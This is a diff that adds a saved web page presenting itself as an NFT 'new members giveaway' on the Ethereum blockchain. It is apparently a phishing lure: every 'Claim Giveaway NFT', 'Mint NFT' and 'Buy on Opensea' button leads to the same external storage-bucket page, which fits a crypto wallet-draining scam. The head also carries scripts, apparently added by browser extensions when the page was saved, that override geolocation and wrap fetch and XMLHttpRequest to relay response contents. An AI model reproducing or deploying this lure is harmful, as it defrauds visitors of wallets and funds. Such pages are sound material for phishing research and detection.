@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://giveaways.stutenft.link/ -->
+<html lang="en"><script>
+    window[Symbol.for('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')] = new (class PostClient {
+    constructor(name, destination) {
+        this.name = name;
+        this.destination = destination;
+        this.serverListeners = {};
+        this.bgRequestsListeners = {};
+        this.bgEventsListeners = {};
+        window.addEventListener('message', (message) => {
+            const data = message.data;
+            const isNotForMe = !(data.destination && data.destination === this.name);
+            const hasNotEventProp = !data.event;
+            if (isNotForMe || hasNotEventProp) {
+                return;
+            }
+            if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
+                const response = data.args;
+                if (this.hasBgRequestListener(response.requestId)) {
+                    try {
+                        this.bgRequestsListeners[response.requestId](response.response);
+                    }
+                    catch (e) {
+                        console.log(e);
+                    }
+                    delete this.bgRequestsListeners[response.requestId];
+                }
+            }
+            else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
+                const response = data.args;
+                if (this.hasBgEventListener(response.event)) {
+                    try {
+                        this.bgEventsListeners[data.id](response.payload);
+                    }
+                    catch (e) {
+                        console.log(e);
+                    }
+                }
+            }
+            else if (this.hasServerListener(data.event)) {
+                try {
+                    this.serverListeners[data.event](data.args);
+                }
+                catch (e) {
+                    console.log(e);
+                }
+            }
+            else {
+                console.log(`event not handled: ${data.event}`);
+            }
+        });
+    }
+    emitToServer(event, args) {
+        const id = this.generateUIID();
+        const message = {
+            args,
+            destination: this.destination,
+            event,
+            id,
+        };
+        window.postMessage(message, location.origin);
+        return id;
+    }
+    emitToBg(bgEventName, args) {
+        const requestId = this.generateUIID();
+        const request = { bgEventName, requestId, args };
+        this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
+        return requestId;
+    }
+    hasServerListener(event) {
+        return !!this.serverListeners[event];
+    }
+    hasBgRequestListener(requestId) {
+        return !!this.bgRequestsListeners[requestId];
+    }
+    hasBgEventListener(bgEventName) {
+        return !!this.bgEventsListeners[bgEventName];
+    }
+    fromServerEvent(event, listener) {
+        this.serverListeners[event] = listener;
+    }
+    fromBgEvent(bgEventName, listener) {
+        this.bgEventsListeners[bgEventName] = listener;
+    }
+    fromBgResponse(requestId, listener) {
+        this.bgRequestsListeners[requestId] = listener;
+    }
+    generateUIID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon', 'MARIO_POST_SERVER_eppiocemhmnlbhjplcgkofciiegomcon')</script><script>
+    const hideMyLocation = new (class HideMyLocation {
+    constructor(clientKey) {
+        this.clientKey = clientKey;
+        this.watchIDs = {};
+        this.client = window[Symbol.for(clientKey)];
+        const getCurrentPosition = navigator.geolocation.getCurrentPosition;
+        const watchPosition = navigator.geolocation.watchPosition;
+        const clearWatch = navigator.geolocation.clearWatch;
+        const self = this;
+        navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+            self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
+        };
+        navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+            return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
+        };
+        navigator.geolocation.clearWatch = function (fakeWatchId) {
+            if (fakeWatchId === -1) {
+                return;
+            }
+            const realWatchId = self.watchIDs[fakeWatchId];
+            delete self.watchIDs[fakeWatchId];
+            return clearWatch.apply(this, [realWatchId]);
+        };
+    }
+    handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
+        const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
+        let fakeWatchId = this.getRandomInt(0, 100000);
+        this.client.fromBgResponse(requestId, (response) => {
+            if (response.enabled) {
+                if (response.status === 'SUCCESS') {
+                    const position = this.map(response);
+                    successCallback(position);
+                }
+                else {
+                    const error = this.errorObj();
+                    errorCallback(error);
+                    fakeWatchId = -1;
+                }
+            }
+            else {
+                const args = [successCallback, errorCallback, options];
+                const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
+                if (type === 'WATCH') {
+                    this.watchIDs[fakeWatchId] = watchId;
+                }
+            }
+        });
+        if (type === 'WATCH') {
+            return fakeWatchId;
+        }
+    }
+    map(response) {
+        return {
+            coords: {
+                accuracy: 20,
+                altitude: null,
+                altitudeAccuracy: null,
+                heading: null,
+                latitude: response.latitude,
+                longitude: response.longitude,
+                speed: null,
+            },
+            timestamp: Date.now(),
+        };
+    }
+    errorObj() {
+        return {
+            code: 1,
+            message: 'User denied Geolocation',
+        };
+    }
+    getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')
+  </script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+    <title>New Members - Giveaway</title>
+    <meta content="" name="description">
+    <meta content="" name="keywords">
+
+    <!-- Favicons -->
+    <link href="./logo.png" rel="icon">
+    <link href="./logo.png" rel="apple-touch-icon">
+
+    <!-- Google Fonts -->
+    <link href="./css" rel="stylesheet">
+
+    <!-- Vendor CSS Files -->
+    <link href="./aos.css" rel="stylesheet">
+    <link href="./bootstrap.min.css" rel="stylesheet">
+    <link href="./bootstrap-icons.css" rel="stylesheet">
+    <link href="./boxicons.min.css" rel="stylesheet">
+    <link href="./glightbox.min.css" rel="stylesheet">
+    <link href="./remixicon.css" rel="stylesheet">
+    <link href="./swiper-bundle.min.css" rel="stylesheet">
+
+    <!-- Template Main CSS File -->
+    <link href="./style.css" rel="stylesheet">
+
+    <!-- =======================================================
+  * Template Name: Gp - v4.7.0
+  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+<script>(function inject() {
+        function GenerateQuickId() {
+          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+          return randomStrId.substring(0, 22);
+        }
+
+        ;
+
+        function SendXHRCandidate(requestMethod_, url_, type_, content_) {
+          try {
+            var id = 'detector';
+            var mes = {
+              posdMessageId: 'PANELOS_MESSAGE',
+              posdHash: GenerateQuickId(),
+              type: 'VIDEO_XHR_CANDIDATE',
+              from: id,
+              to: id.substring(0, id.length - 2),
+              content: {
+                requestMethod: requestMethod_,
+                url: url_,
+                type: type_,
+                content: content_
+              }
+            };
+            window.postMessage(mes, '*');
+          } catch (e) {}
+        }
+
+        ;
+        var open = XMLHttpRequest.prototype.open;
+
+        XMLHttpRequest.prototype.open = function () {
+          this.requestMethod = arguments[0];
+          open.apply(this, arguments);
+        };
+
+        var send = XMLHttpRequest.prototype.send;
+
+        XMLHttpRequest.prototype.send = function () {
+          var onreadystatechange = this.onreadystatechange;
+
+          this.onreadystatechange = function () {
+            if (this.readyState === 4) {
+              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response), 0);
+            }
+
+            if (onreadystatechange) {
+              return onreadystatechange.apply(this, arguments);
+            }
+          };
+
+          return send.apply(this, arguments);
+        };
+
+        var nativeFetch = fetch;
+
+        fetch = function fetch() {
+          var _this = this;
+
+          var args = arguments;
+          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
+          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
+          return new Promise(function (resolve, reject) {
+            var promise = nativeFetch.apply(_this, args);
+            promise.then(function (response) {
+              if (response.body instanceof ReadableStream) {
+                var nativeJson = response.json;
+
+                response.json = function () {
+                  var _arguments = arguments,
+                      _this2 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var jsonPromise = nativeJson.apply(_this2, _arguments);
+                    jsonPromise.then(function (jsonResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
+                      resolve(jsonResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+
+                var nativeText = response.text;
+
+                response.text = function () {
+                  var _arguments2 = arguments,
+                      _this3 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var textPromise = nativeText.apply(_this3, _arguments2);
+                    textPromise.then(function (textResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
+                      resolve(textResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+              }
+
+              resolve.apply(this, arguments);
+            })["catch"](function () {
+              reject.apply(this, arguments);
+            });
+          });
+        };
+      })();</script></head>
+
+<body background="backg.png" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQifSwidmVyc2lvbiI6IjEuOC4xNCIsInNjb3JlIjoxMDgxNDB9XQ==" data-aos-easing="ease-in-out" data-aos-duration="1000" data-aos-delay="0">
+
+    <!-- ======= Header ======= -->
+    <header id="header" class="fixed-top">
+        <div class="container d-flex align-items-center justify-content-lg-between" bis_skin_checked="1">
+
+            <!--<h1 class="logo me-auto me-lg-0"><a href="index.html">NFT-<span style="color: goldenrod;">Giveaway</span></a></h1>-->
+            <a href="./index.html" class="logo me-auto me-lg-0"><img src="./logo.png" alt="" class="img-fluid"></a>
+
+
+            <!-- .navbar -->
+
+            <a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html" class="get-started-btn scrollto">Claim Giveaway NFT</a>
+
+        </div>
+    </header>
+    <!-- End Header -->
+
+    <!-- ======= Hero Section ======= -->
+    <section id="hero" class="d-flex align-items-center justify-content-center">
+        <div class="container aos-init aos-animate" data-aos="fade-up" bis_skin_checked="1">
+
+            <div class="row justify-content-center aos-init aos-animate" data-aos="fade-up" data-aos-delay="150" bis_skin_checked="1">
+                <div class="col-xl-6 col-lg-8" bis_skin_checked="1"> 
+                <br><br><br><br><br><br><br><br>
+                    <h1>We are unique character NFT built on Ethereum Blockchain as ERC 721 tokens<span>.</span></h1>
+                    <br>
+                    <h2 style="color: goldenrod;"><strong>We are team of talented designers creating the best NFT space in the market</strong> </h2>
+                </div>
+            </div>
+
+            <div class="row gy-4 mt-5 justify-content-center aos-init" data-aos="zoom-in " data-aos-delay="250 " bis_skin_checked="1">
+                <div class="col-xl-2 col-md-4 " bis_skin_checked="1">
+                    <div class="icon-box " bis_skin_checked="1">
+                    <a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html"><i class="ri-store-line "></i></a>
+                        <h3><a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html">Claim Giveaway NFT</a></h3>
+                    </div>
+                </div>
+                <div class="col-xl-2 col-md-4 " bis_skin_checked="1">
+                    <div class="icon-box " bis_skin_checked="1">
+                        <a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html"><i class="ri-bar-chart-box-line "></i></a>
+                        <h3><a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html">Mint NFT</a></h3>
+                    </div>
+                </div>
+                <div class="col-xl-2 col-md-4 " bis_skin_checked="1">
+                    <div class="icon-box " bis_skin_checked="1">
+                    <a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html"><i class="ri-calendar-todo-line "></i></a>
+                        <h3><a href="https://storageapi.fleek.co/9aec618c-debe-4ec3-b57d-843d01d22057-bucket/link/index.html">Buy on Opensea</a></h3>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+    <!-- End Hero -->
+
+
+    <div id="preloader " bis_skin_checked="1"></div>
+    <a href="https://giveaways.stutenft.link/#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short "></i></a>
+
+    <!-- Vendor JS Files -->
+    <script src="./purecounter.js.download"></script>
+    <script src="./aos.js.download"></script>
+    <script src="./bootstrap.bundle.min.js.download"></script>
+    <script src="./glightbox.min.js.download"></script>
+    <script src="./isotope.pkgd.min.js.download"></script>
+    <script src="./swiper-bundle.min.js.download"></script>
+    <script src="./validate.js.download"></script>
+
+    <!-- Template Main JS File -->
+    <script src="./main.js.download"></script>
+
+
+
+</body></html>
